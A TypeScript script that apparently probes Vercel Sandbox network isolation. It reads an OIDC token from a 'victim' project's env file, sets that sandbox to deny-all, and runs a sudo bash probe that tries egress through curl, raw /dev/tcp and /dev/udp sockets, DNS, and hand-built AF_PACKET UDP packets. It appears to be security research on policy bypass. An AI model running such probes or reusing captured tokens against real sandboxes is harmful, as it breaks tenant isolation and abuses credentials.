import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  console.log("updating policy to deny-all...");
  await sbx.updateNetworkPolicy("deny-all");
  console.log("policy updated");

  const EXPLORE = `#!/bin/bash
set +e
echo "=== my ip ==="
ip -4 addr show eth0 | grep inet | awk '{print $2}'
echo "=== 1. HTTP egress (should be blocked under deny-all) ==="
timeout 5 curl -s -o /dev/null -w "http_code=%{http_code} err=%{errormsg}\\n" --max-time 4 http://1.1.1.1/ 2>&1 | head -3
timeout 5 curl -s -o /dev/null -w "https_code=%{http_code} err=%{errormsg}\\n" --max-time 4 https://8.8.8.8/ 2>&1 | head -3
timeout 5 curl -s -o /dev/null -w "https_example=%{http_code} err=%{errormsg}\\n" --max-time 4 https://example.com/ 2>&1 | head -3
echo "=== 2. raw TCP to 8.8.8.8:443 ==="
timeout 5 bash -c 'exec 3<>/dev/tcp/8.8.8.8/443 && echo CONNECTED-OK >&3 && head -c 100 <&3' 2>&1 | head -c 300
echo
echo "=== 3. raw TCP to 1.1.1.1:80 ==="
timeout 5 bash -c 'exec 3<>/dev/tcp/1.1.1.1/80 && printf "GET / HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n" >&3 && head -c 200 <&3' 2>&1 | head -c 300
echo
echo "=== 4. UDP to 8.8.8.8:53 ==="
timeout 4 bash -c 'printf "test" > /dev/udp/8.8.8.8/53' 2>&1; echo "udp_send_rc=$?"
echo "=== 5. ping 8.8.8.8 ==="
timeout 4 ping -c 2 -W 2 8.8.8.8 2>&1 | head -4
echo "=== 6. DNS resolution via host dns 172.31.0.2 ==="
cat /etc/resolv.conf
getent hosts example.com 2>&1 | head -2
nslookup example.com 172.31.0.2 2>&1 | head -8
echo "=== 7. raw AF_PACKET UDP to 8.8.8.8:53 + sniff ==="
timeout 6 python3 - <<'PYEOF'
import socket, struct, select, time, binascii, sys, os
iface="eth0"
myip = None
import subprocess
out = subprocess.check_output(["ip","-4","addr","show","eth0"]).decode()
for line in out.splitlines():
    if "inet " in line:
        myip = line.strip().split()[1].split("/")[0]
mac = open("/sys/class/net/eth0/address").read().strip()
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind((iface,0))
# craft IP/UDP packet to 8.8.8.8:53
src = socket.inet_aton(myip); dst = socket.inet_aton("8.8.8.8")
udp = struct.pack("!HHHHH", 5353, 53, 8, 0, b"hello")
ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20+len(udp), 0x1234, 0, 64, 17, 0, src, dst)
pkt = ip + udp
eth = struct.pack("!6s6sH", binascii.unhexlify(mac.replace(":","")), binascii.unhexlify(mac.replace(":","")), 0x0800)
try:
    s.send(eth+pkt)
    print("raw UDP sent to 8.8.8.8:53", flush=True)
except Exception as e:
    print("send err", e)
# sniff for a while for responses
end = time.time()+4
resp = 0
while time.time()<end:
    r,_,_ = select.select([s],[],[],0.5)
    if not r: continue
    try: data = s.recv(65535)
    except Exception: continue
    if len(data) < 42: continue
    eh = data[:14]
    _, srcm, etype = struct.unpack("!6s6sH", eh)
    if etype != 0x0800: continue
    iph = data[14:34]
    if iph[9] != 17: continue
    ipdst = socket.inet_ntoa(iph[16:20])
    print("UDP reply from", ipdst, "srcmac", ":".join("%02x"%x for x in srcm), flush=True)
    resp += 1
    break
print("raw probe done, replies:", resp)
PYEOF
echo "=== 8. /dev/tcp to 172.31.0.2:53 (host DNS) ==="
timeout 4 bash -c 'printf "A\\x00\\x01" > /dev/udp/172.31.0.2/53' 2>&1; echo "rc=$?"
echo "=== 9. traceroute-ish to 8.8.8.8 ==="
timeout 4 cat /proc/net/arp 2>&1
echo DONE`;

  const SCRIPT = `set +e
cat > /tmp/explore21.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore21.sh 2>&1
echo "=== rc: $? ==="
`;
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });